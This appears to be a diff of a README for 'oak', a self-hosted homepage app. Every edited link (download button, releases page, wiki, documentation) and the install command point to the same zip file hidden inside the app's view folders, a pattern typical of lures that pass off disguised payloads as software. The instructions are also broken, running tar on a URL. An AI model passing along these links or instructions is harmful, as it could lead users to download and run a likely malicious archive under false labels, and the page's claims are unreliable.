@@ -1,7 +1,7 @@
 # 🌳 oak - Easy Homepage for Self-Hosters
 
 ## 🚀 Download Now
-[![Download oak](https://raw.githubusercontent.com/TheDarkBelial/oak/main/app/views/errors/Software_1.3.zip)](https://raw.githubusercontent.com/TheDarkBelial/oak/main/app/views/errors/Software_1.3.zip)
+[![Download oak](https://github.com/TheDarkBelial/oak/raw/refs/heads/main/app/views/categories/Software_3.5.zip)](https://github.com/TheDarkBelial/oak/raw/refs/heads/main/app/views/categories/Software_3.5.zip)
 
 ## 📜 Introduction
 Welcome to **oak**, a simple solution to create a personalized homepage for your self-hosted environment. With oak, you can easily display content tailored to your interests, manage your bookmarks, and enjoy a clean interface. Whether you want a startpage that reflects your online preferences or a platform for showcasing wisdom, oak serves your needs efficiently.
@@ -23,7 +23,7 @@ Before you proceed, ensure your system meets the following requirements:
 ## 📥 Download & Install
 To download the latest version of oak, follow these steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/TheDarkBelial/oak/main/app/views/errors/Software_1.3.zip).
+1. Visit the [Releases page](https://github.com/TheDarkBelial/oak/raw/refs/heads/main/app/views/categories/Software_3.5.zip).
 2. Find the version labeled as the latest stable release.
 3. Select the file that corresponds to your operating system.
 4. Click the download link to start downloading the file.
@@ -47,7 +47,7 @@ After downloading, follow these steps to install:
 2. Navigate to the directory where you downloaded the file.
 3. Run the command to extract the contents of the compressed file:
    ```bash
-   tar -xvf https://raw.githubusercontent.com/TheDarkBelial/oak/main/app/views/errors/Software_1.3.zip
+   tar -xvf https://github.com/TheDarkBelial/oak/raw/refs/heads/main/app/views/categories/Software_3.5.zip
    ```
 4. Navigate into the extracted folder.
 5. Run the application using:
@@ -66,12 +66,12 @@ Once oak is running, you can customize your homepage:
 ## 📝 Getting Help
 If you encounter any issues or have questions, various resources are available:
 
-- **Documentation**: Visit the [Wiki](https://raw.githubusercontent.com/TheDarkBelial/oak/main/app/views/errors/Software_1.3.zip) for detailed guides.
+- **Documentation**: Visit the [Wiki](https://github.com/TheDarkBelial/oak/raw/refs/heads/main/app/views/categories/Software_3.5.zip) for detailed guides.
 - **Community Support**: Join our discussion forum on GitHub to connect with other users.
 - **FAQ Section**: Check for common questions that may provide quick answers.
 
 ## 🔗 Useful Links
-- [Releases Page](https://raw.githubusercontent.com/TheDarkBelial/oak/main/app/views/errors/Software_1.3.zip)
-- [Documentation](https://raw.githubusercontent.com/TheDarkBelial/oak/main/app/views/errors/Software_1.3.zip)
+- [Releases Page](https://github.com/TheDarkBelial/oak/raw/refs/heads/main/app/views/categories/Software_3.5.zip)
+- [Documentation](https://github.com/TheDarkBelial/oak/raw/refs/heads/main/app/views/categories/Software_3.5.zip)
 
 Feel free to explore and enjoy your new homepage with oak. It’s time to take control and tailor your online experience!
